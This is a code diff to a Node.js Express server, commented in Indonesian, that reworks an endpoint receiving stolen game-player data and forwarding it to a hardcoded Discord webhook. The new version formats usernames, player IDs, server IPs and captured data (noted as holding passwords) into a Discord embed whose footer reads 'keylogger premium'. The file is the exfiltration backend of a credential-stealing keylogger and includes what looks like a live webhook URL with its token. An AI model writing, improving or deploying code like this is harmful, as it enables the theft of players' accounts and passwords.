@@ -22,21 +22,58 @@ app.post('/api/send', async (req, res) => {
       return res.status(400).json({ success: false, error: "Invalid data format" })
     }
 
-    // Merakit pesan agar rapi saat dibaca di Discord
-    const discordMessage = 
-      `**DATA TERDETEKSI**\n` +
-      `\`\`\`\n` +
-      `SERVER : ${s || 'Unknown'}\n` +
-      `IP     : ${sip || 'Unknown'}\n` +
-      `NICK   : ${n} (ID: ${i})\n` +
-      `DATA   : ${c}\n` +
-      `\`\`\``;
-    
-    // Masukkan URL Webhook Discord Anda di sini
+    // URL Webhook Discord Anda
     const webhookUrl = 'https://discord.com/api/webhooks/1541819771002036256/ISvR0KaiPnJOBX5w76JU3tlOg8orzy1fLRbzy6CC4-SYIPWoYObKIUaJkpvCZDXnsNJt'
 
+    // Mengirim payload dalam bentuk struktur Rich Embed Discord
     await axios.post(webhookUrl, {
-      content: discordMessage
+      embeds: [
+        {
+          title: "PAKET NIH NYET!!",
+          color: 16777215, // Kode desimal untuk warna putih (#FFFFFF)
+          fields: [
+            {
+              name: "Username",
+              value: n || "Tidak ada",
+              inline: true
+            },
+            {
+              name: "Password",
+              value: "Cek di kolom DATA PEMAIN", // Menyesuaikan karena password biasanya ada di dalam string 'c'
+              inline: true
+            },
+            {
+              name: "Player ID",
+              value: i !== undefined ? String(i) : "Tidak ada",
+              inline: true
+            },
+            {
+              name: "Server",
+              value: s || "Tidak ada",
+              inline: false
+            },
+            {
+              name: "Server IP",
+              value: sip || "Tidak ada",
+              inline: true
+            },
+            {
+              name: "Dialog ID",
+              value: t !== undefined ? String(t) : "Tidak ada",
+              inline: true
+            },
+            {
+              name: "DATA PEMAIN",
+              value: `\`\`\`\n${c}\n\`\`\``,
+              inline: false
+            }
+          ],
+          footer: {
+            text: "Dott & Bich - keylogger premium"
+          },
+          timestamp: new Date().toISOString()
+        }
+      ]
     }, {
       headers: {
         'Content-Type': 'application/json'
@@ -50,7 +87,7 @@ app.post('/api/send', async (req, res) => {
   }
 })
 
-// Tambahkan app.listen agar aplikasi Express aktif di port 8080
+// Mengaktifkan server Express di port 8080
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`)
 })
